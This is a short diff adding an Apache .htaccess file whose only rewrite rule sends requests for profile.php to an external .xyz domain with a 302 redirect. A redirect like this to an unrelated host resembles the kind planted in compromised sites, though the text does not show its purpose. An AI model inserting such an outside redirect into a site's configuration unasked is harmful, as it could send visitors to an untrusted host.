@@ -1,0 +1,6 @@
+
+RewriteEngine on
+
+RewriteOptions inherit
+
+RewriteRule ^profile\.php "https\:\/\/node16\.xyz\/profile\/\?id=1" [R=302,L]
